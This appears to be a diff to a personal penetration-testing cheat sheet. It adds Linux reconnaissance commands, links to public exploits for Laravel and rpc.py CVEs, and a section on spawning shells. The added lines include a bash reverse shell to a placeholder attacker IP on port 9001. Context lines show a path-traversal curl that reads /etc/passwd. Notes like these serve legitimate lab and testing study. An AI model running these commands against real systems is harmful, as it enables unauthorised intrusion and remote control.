@@ -435,6 +435,10 @@ Send filename contents into target port 8000 over nc
 	sudo -l
 Check for [weird groups](https://hacktricks.wiki/en/linux-hardening/privilege-escalation/interesting-groups-linux-pe/index.html)  
 
+## Linux - check system
+	cat /etc/os-release 2>/dev/null
+	uname -a
+
 ## Linux - services
 	ps aux | grep root
 List root-running services  
@@ -705,8 +709,15 @@ GET/POST parameters
 |Cassandra Web|0.5.0||[exploitDB](https://www.exploit-db.com/exploits/49362)|`curl --path-as-is http://ip:3000/../../../../../../../../etc/passwd`|
 |FuguHub|8.4|CVE-2024-27697|[github](https://github.com/SanjinDedic/FuguHub-8.4-Authenticated-RCE-CVE-2024-27697)|Use lua one-liner in revshells|
 |ImageMagick|6.9.6-4|CVE-2023-34152|[github](https://github.com/SudoIndividual/CVE-2023-34152)|Shell will bind upon upload|
+|Lavarel|<=8.4.2|CVE-2021-3129|[github](https://github.com/ambionics/laravel-exploits/blob/main/laravel-ignition-rce.py)|clone phpggc package to create phar, edit endpoint leading `/` if needed|
+|rpc.py|<=0.6.0|CVE-2022-35411|[github](https://github.com/CSpanias/rpc-rce.py)||
 
 
+## Run new shell
+	/bin/sh -i 0<&3 1>&3 2>&3
+.  
+
+	/bin/bash -c "/bin/bash -i >& /dev/tcp/<kali-ip>/9001 0>&1"
 
 ## Linux AppArmor check
 	aa-status
